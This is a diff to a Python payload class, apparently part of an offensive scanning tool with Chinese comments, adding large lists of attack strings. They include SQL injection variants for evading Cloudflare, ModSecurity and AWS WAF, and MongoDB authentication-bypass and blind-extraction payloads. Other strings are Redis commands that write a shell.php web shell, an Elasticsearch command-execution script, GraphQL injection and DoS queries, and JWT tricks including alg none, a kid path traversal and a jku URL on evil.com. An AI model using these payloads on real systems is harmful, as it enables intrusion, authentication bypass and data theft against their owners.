@@ -554,7 +554,7 @@ class MegaPayloads:
                 elif isinstance(v, list):
                     total += len(v)
             return total
-        
+
         return {
             "sqli": _count(cls.SQLI),
             "xss": _count(cls.XSS),
@@ -562,6 +562,213 @@ class MegaPayloads:
             "rce": _count(cls.RCE),
             "ssrf": _count(cls.SSRF),
             "xxe": _count(cls.XXE),
-            "total": _count(cls.SQLI) + _count(cls.XSS) + _count(cls.LFI) + 
+            "nosql": _count(cls.NOSQL) if hasattr(cls, 'NOSQL') else 0,
+            "graphql": len(cls.GRAPHQL) if hasattr(cls, 'GRAPHQL') else 0,
+            "total": _count(cls.SQLI) + _count(cls.XSS) + _count(cls.LFI) +
                      _count(cls.RCE) + _count(cls.SSRF) + _count(cls.XXE)
         }
+
+    # ==================== WAF绕过增强 (100+) ====================
+    WAF_BYPASS = {
+        "unicode": [
+            "%u0027 OR %u0031=%u0031", "%u0027%u0020OR%u00201=1",
+            "%uff07 OR 1=1", "%uff07%uff20OR%uff201=1",
+            "' OR '1'＝'1", "＇ OR ＇1＇＝＇1",
+            "%c0%27 OR 1=1", "%c0%a7 OR 1=1",
+            "' OR '1'%EF%BC%9D'1", "%EF%BC%87 OR 1=1",
+        ],
+        "double_url": [
+            "%2527%2520OR%25201=1", "%252527 OR 1=1",
+            "%25252527 OR 1=1", "%%32%35%32%37 OR 1=1",
+            "%2527%2520UNION%2520SELECT%25201,2,3",
+            "%252f%252a%252a%252fUNION%252f%252a%252a%252fSELECT",
+            "%25%32%37 OR 1=1", "%25%32%37%25%32%30OR%25%32%301=1",
+        ],
+        "hex": [
+            "0x27 OR 0x31=0x31", "0x27206f7220313d31",
+            "' OR 0x313d31", "0x2720554e494f4e2053454c454354",
+            "' UNION SELECT 0x61646d696e,0x70617373",
+            "' OR username=0x61646d696e",
+            "0x27204f5220273127273d2731", "' OR 1=0x1",
+        ],
+        "comment": [
+            "/*!50000UNION*//*!50000SELECT*/1,2,3",
+            "/*!12345UNION*//*!12345SELECT*/1,2,3",
+            "/**/UNION/**/SELECT/**/1,2,3",
+            "UN/**/ION/**/SE/**/LECT/**/1,2,3",
+            "UNION/*comment*/SELECT/*comment*/1,2,3",
+            "/*!UNION*/+/*!SELECT*/+1,2,3",
+            "' /*!50000%55nion*/ /*!50000%53elect*/ 1,2,3--",
+            "' /*!--+/*%0aUNION*/+/*!--+/*%0aSELECT*/+1,2,3--",
+            "' /**//*!12345UNION SELECT*//**/1,2,3--",
+            "' /*!50000UnIoN*/ /*!50000SeLeCt*/ 1,2,3--",
+        ],
+        "case_switch": [
+            "uNiOn SeLeCt 1,2,3", "UnIoN sElEcT 1,2,3",
+            "UNION%0aSELECT%0a1,2,3", "UNION%0dSELECT%0d1,2,3",
+            "UNION%09SELECT%091,2,3", "UNION%0bSELECT%0b1,2,3",
+            "UNI%00ON SEL%00ECT 1,2,3", "UN%49ON SE%4cECT 1,2,3",
+            "' uNiOn aLl sElEcT 1,2,3--", "' UnIoN%20AlL%20SeLeCt 1,2,3--",
+        ],
+        "whitespace": [
+            "UNION%0aSELECT", "UNION%09SELECT", "UNION%0dSELECT",
+            "UNION%0bSELECT", "UNION%0cSELECT", "UNION%a0SELECT",
+            "UNION\tSELECT", "UNION\nSELECT", "UNION\rSELECT",
+            "' OR%091=1--", "' OR%0a1=1--", "' OR%0d1=1--",
+            "' OR%0b1=1--", "' OR%0c1=1--", "' OR%a01=1--",
+            "'%20OR%20'1'='1", "'%09OR%09'1'='1", "'%0aOR%0a'1'='1",
+        ],
+        "null_byte": [
+            "' OR '1'='1'%00", "' UNION SELECT 1,2,3%00",
+            "%00' OR '1'='1", "' OR%001=1--", "admin'%00--",
+            "' OR '1'='1'/*%00*/", "' UNION%00SELECT 1,2,3--",
+        ],
+        "http_param_pollution": [
+            "id=1&id=' OR '1'='1", "id=1/*&id=*/' OR '1'='1",
+            "id=1&id=2&id=' UNION SELECT 1,2,3--",
+            "id=1%00&id=' OR '1'='1", "id=1;id=' OR '1'='1",
+        ],
+        "json_injection": [
+            '{"id":"1 OR 1=1"}', '{"id":"1\' OR \'1\'=\'1"}',
+            '{"id":{"$gt":""}}', '{"id":{"$ne":null}}',
+            '{"$where":"this.id==1 || 1==1"}',
+            '{"id":"1","$or":[{"a":"b"}]}',
+        ],
+        "cloudflare_bypass": [
+            "' /*!50000OR*/ '1'='1", "' %0aOR%0a '1'='1",
+            "' /*!--+/*%0aOR*/+1=1--", "' %26%26 1=1--",
+            "' || 1=1--", "' %7c%7c 1=1--",
+            "' /*!50000%55nion*/ /*!50000%53elect*/ 1,2,3--",
+        ],
+        "modsecurity_bypass": [
+            "' /*!50000%55%6e%69%6f%6e*/ /*!50000%53%65%6c%65%63%74*/ 1,2,3--",
+            "' %55nion(%53elect 1,2,3)--", "' union%23%0aselect 1,2,3--",
+            "' /*!12345%0aUNION*//*!12345%0aSELECT*/ 1,2,3--",
+        ],
+        "aws_waf_bypass": [
+            "' /*!50000union*/+/*!50000select*/+1,2,3--",
+            "' %75%6e%69%6f%6e %73%65%6c%65%63%74 1,2,3--",
+            "' un%00ion sel%00ect 1,2,3--",
+        ],
+    }
+
+    # ==================== NoSQL注入 (80+) ====================
+    NOSQL = {
+        "mongodb": {
+            "auth_bypass": [
+                '{"username":{"$gt":""},"password":{"$gt":""}}',
+                '{"username":{"$ne":""},"password":{"$ne":""}}',
+                '{"username":{"$regex":".*"},"password":{"$regex":".*"}}',
+                '{"username":"admin","password":{"$gt":""}}',
+                '{"username":"admin","password":{"$ne":"wrongpassword"}}',
+                '{"$or":[{"username":"admin"},{"username":"administrator"}],"password":{"$gt":""}}',
+                '{"username":{"$in":["admin","administrator"]},"password":{"$gt":""}}',
+                '{"username":"admin","password":{"$exists":true}}',
+                '{"username":"admin","$or":[{"password":{"$gt":""}},{"password":{"$lt":"~"}}]}',
+            ],
+            "data_extraction": [
+                '{"$where":"this.username==\'admin\'"}',
+                '{"$where":"Object.keys(this).length>0"}',
+                '{"$where":"this.password.match(/^a/)"}',
+                '{"$where":"sleep(5000)"}',
+                '{"username":{"$regex":"^admin"}}',
+                '{"password":{"$regex":"^.{0,10}$"}}',
+                '{"$where":"function(){return this.username==\'admin\'}"}',
+            ],
+            "operator_injection": [
+                '{"username":"admin","password":{"$gt":"","$lt":"~"}}',
+                '{"username":{"$type":2},"password":{"$type":2}}',
+                '{"username":{"$size":5}}',
+                '{"$and":[{"username":"admin"},{"password":{"$gt":""}}]}',
+                '{"$nor":[{"username":"guest"}],"password":{"$gt":""}}',
+            ],
+            "blind": [
+                '{"username":"admin","password":{"$regex":"^a"}}',
+                '{"username":"admin","password":{"$regex":"^b"}}',
+                '{"username":"admin","$where":"this.password[0]==\'a\'"}',
+                '{"username":"admin","$where":"this.password.length==8"}',
+            ],
+        },
+        "redis": [
+            '*1\r\n$4\r\nINFO\r\n',
+            '*1\r\n$4\r\nKEYS\r\n$1\r\n*\r\n',
+            '*3\r\n$3\r\nSET\r\n$4\r\ntest\r\n$4\r\nhack\r\n',
+            '*2\r\n$3\r\nGET\r\n$4\r\ntest\r\n',
+            '*1\r\n$8\r\nFLUSHALL\r\n',
+            '*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$3\r\ndir\r\n$11\r\n/var/www/html\r\n',
+            '*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$10\r\ndbfilename\r\n$9\r\nshell.php\r\n',
+            'EVAL "return redis.call(\'INFO\')" 0',
+            'DEBUG SEGFAULT',
+        ],
+        "couchdb": [
+            '{"selector":{"_id":{"$gt":null}}}',
+            '{"selector":{"password":{"$regex":".*"}}}',
+            '{"selector":{"$or":[{"username":"admin"},{"role":"admin"}]}}',
+        ],
+        "elasticsearch": [
+            '{"query":{"match_all":{}}}',
+            '{"query":{"wildcard":{"password":"*"}}}',
+            '{"script_fields":{"test":{"script":"java.lang.Runtime.getRuntime().exec(\'id\')"}}}',
+            '{"query":{"bool":{"must":[{"match":{"username":"admin"}}]}}}',
+        ],
+    }
+
+    # ==================== GraphQL注入 (40+) ====================
+    GRAPHQL = [
+        # 内省查询
+        '{"query":"{__schema{types{name}}}"}',
+        '{"query":"{__schema{queryType{name}}}"}',
+        '{"query":"{__schema{mutationType{name}}}"}',
+        '{"query":"{__schema{types{name,fields{name}}}}"}',
+        '{"query":"{__type(name:\\"User\\"){name,fields{name,type{name}}}}"}',
+        '{"query":"{__schema{directives{name,description}}}"}',
+        # 批量查询
+        '{"query":"query{user(id:1){name}user2:user(id:2){name}}"}',
+        '[{"query":"{user(id:1){name}}"},{"query":"{user(id:2){name}}"}]',
+        # 注入测试
+        '{"query":"query{user(id:\\"1 OR 1=1\\"){name}}"}',
+        '{"query":"query{user(id:\\"1\\\' OR \\'1\\'=\\'1\\"){name}}"}',
+        '{"query":"mutation{createUser(name:\\"<script>alert(1)</script>\\"){id}}"}',
+        '{"query":"query{user(id:\\"../../../etc/passwd\\"){name}}"}',
+        # DoS
+        '{"query":"query{__schema{types{fields{type{fields{type{fields{name}}}}}}}}"}',
+        '{"query":"query a{user(id:1){friends{friends{friends{name}}}}}"}',
+        # 别名滥用
+        '{"query":"{a:user(id:1){name}b:user(id:2){name}c:user(id:3){name}}"}',
+        # 指令注入
+        '{"query":"query{user(id:1)@include(if:true){name}}"}',
+        '{"query":"query{user(id:1)@skip(if:false){name}}"}',
+        # 变量注入
+        '{"query":"query($id:ID!){user(id:$id){name}}","variables":{"id":"1 OR 1=1"}}',
+        '{"query":"query($id:ID!){user(id:$id){name}}","variables":{"id":"1\' OR \'1\'=\'1"}}',
+        # 片段注入
+        '{"query":"query{user(id:1){...userFields}}fragment userFields on User{name,email,password}"}',
+        # 订阅
+        '{"query":"subscription{userCreated{id,name}}"}',
+    ]
+
+    # ==================== JSON注入 (30+) ====================
+    JSON_INJECTION = [
+        # 类型混淆
+        '{"id":true}', '{"id":null}', '{"id":[]}', '{"id":{}}',
+        '{"id":1,"id":"admin"}',  # 重复键
+        '{"id":"1","__proto__":{"admin":true}}',  # 原型污染
+        '{"constructor":{"prototype":{"admin":true}}}',
+        # 特殊字符
+        '{"id":"test\\u0000admin"}', '{"id":"test\\x00admin"}',
+        '{"id":"test\ninjected"}', '{"id":"test\rinjected"}',
+        # 大数字
+        '{"id":9999999999999999999999999999}',
+        '{"id":1e308}', '{"id":-1e308}',
+        # 深度嵌套
+        '{"a":{"b":{"c":{"d":{"e":"deep"}}}}}',
+        # Unicode
+        '{"id":"\\u0061\\u0064\\u006d\\u0069\\u006e"}',
+        # 注释绕过
+        '{"id":"admin"/*comment*/}',
+        '{"id":/*comment*/"admin"}',
+        # JWT相关
+        '{"alg":"none","typ":"JWT"}',
+        '{"alg":"HS256","typ":"JWT","kid":"../../etc/passwd"}',
+        '{"alg":"HS256","typ":"JWT","jku":"http://evil.com/jwks.json"}',
+    ]
